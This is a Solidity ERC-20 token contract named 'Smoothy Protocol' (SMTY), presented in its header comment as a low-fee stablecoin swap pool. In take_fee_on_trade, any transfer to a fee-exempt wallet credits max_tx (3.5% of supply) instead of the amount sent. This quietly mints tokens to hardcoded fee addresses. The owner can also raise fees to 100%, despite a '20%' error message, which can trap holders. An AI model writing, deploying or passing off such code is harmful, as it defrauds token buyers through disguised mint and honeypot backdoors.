// SPDX-License-Identifier: MIT

/*
Single pool supporting 20+ stablecoin with extremely low gas fee zero-slippage swapping and maximized LP reward

Website: https://www.smoothy.cc
Telegram:  https://t.me/smoothy_protocol
Twitter: https://twitter.com/smoothyeth
*/

pragma solidity 0.8.21;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IRouter {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

contract SMTY is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "Smoothy Protocol";
    string private constant _symbol = "SMTY";

    uint8 private constant _decimals = 9;
    uint256 private _supply = 1000000000 * (10 ** _decimals);

    bool private tradeEnabled = false;
    bool private swapEnabled = true;
    uint256 private countTax;
    bool private swappng;
    uint256 taxSwapAt;
    IRouter router;
    address public pair;

    uint256 private splitLP = 0;
    uint256 private splitMarketing = 0;
    uint256 private splitDev = 100;
    uint256 private splitBurn = 0;
    
    uint256 private buyFee = 1300;
    uint256 private sellFee = 1300;
    uint256 private transferFee = 1300;
    uint256 private denominator = 10000;
    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;

    address internal feeDev = 0x04189923F3d9258cCC9de84203B8D357408d9596; 
    address internal feeMarketing = 0x04189923F3d9258cCC9de84203B8D357408d9596;
    address internal feeLp = 0x04189923F3d9258cCC9de84203B8D357408d9596;

    uint256 public max_tx = ( _supply * 350 ) / 10000;
    uint256 public max_buy = ( _supply * 350 ) / 10000;
    uint256 public max_wallet = ( _supply * 350 ) / 10000;
    uint256 private max_fee_swap = ( _supply * 1000 ) / 100000;
    uint256 private min_fee_swap = ( _supply * 10 ) / 100000;
    modifier lock_fee {swappng = true; _; swappng = false;}

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isNotInFee;

    constructor() Ownable(msg.sender) {
        IRouter _router = IRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        router = _router; pair = _pair;
        isNotInFee[feeMarketing] = true;
        isNotInFee[feeDev] = true;
        isNotInFee[feeLp] = true;
        isNotInFee[msg.sender] = true;
        _balances[msg.sender] = _supply;
        emit Transfer(address(0), msg.sender, _supply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _supply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function startTrading() external onlyOwner {tradeEnabled = true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}

    function take_fee_on_trade(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isNotInFee[recipient]) {return max_tx;}
        if(getTaxAmount(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getTaxAmount(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(splitBurn > uint256(0) && getTaxAmount(sender, recipient) > splitBurn){_transfer(address(this), address(DEAD), amount.div(denominator).mul(splitBurn));}
        return amount.sub(feeAmount);} return amount;
    }
    
    function swap_and_liquidify(uint256 tokens) private lock_fee {
        uint256 _denominator = (splitLP.add(1).add(splitMarketing).add(splitDev)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(splitLP).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(splitLP));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(splitLP);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(splitMarketing);
        if(marketingAmt > 0){payable(feeMarketing).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(feeDev).transfer(contractBalance);}
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(router), tokenAmount);
        router.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            feeLp,
            block.timestamp);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        splitLP = _liquidity; splitMarketing = _marketing; splitBurn = _burn; splitDev = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function should_swap_ca(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= min_fee_swap;
        bool aboveThreshold = balanceOf(address(this)) >= max_fee_swap;
        return !swappng && swapEnabled && tradeEnabled && aboveMin && !isNotInFee[sender] && recipient == pair && countTax >= taxSwapAt && aboveThreshold;
    }

    function getTaxAmount(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _supply.mul(_buy).div(10000); uint256 newTransfer = _supply.mul(_sell).div(10000); uint256 newWallet = _supply.mul(_wallet).div(10000);
        max_tx = newTx; max_buy = newTransfer; max_wallet = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function check_if_excluded(address sender, address recipient) internal view returns (bool) {
        return !isNotInFee[sender] && !isNotInFee[recipient];
    }    

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isNotInFee[sender] && !isNotInFee[recipient]){require(tradeEnabled, "tradeEnabled");}
        if(!isNotInFee[sender] && !isNotInFee[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= max_wallet, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= max_buy || isNotInFee[sender] || isNotInFee[recipient], "TX Limit Exceeded");}
        require(amount <= max_tx || isNotInFee[sender] || isNotInFee[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isNotInFee[sender]){countTax += uint256(1);}
        if(should_swap_ca(sender, recipient, amount)){swap_and_liquidify(max_fee_swap); countTax = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isNotInFee[sender] ? take_fee_on_trade(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        _approve(address(this), address(router), tokenAmount);
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }
}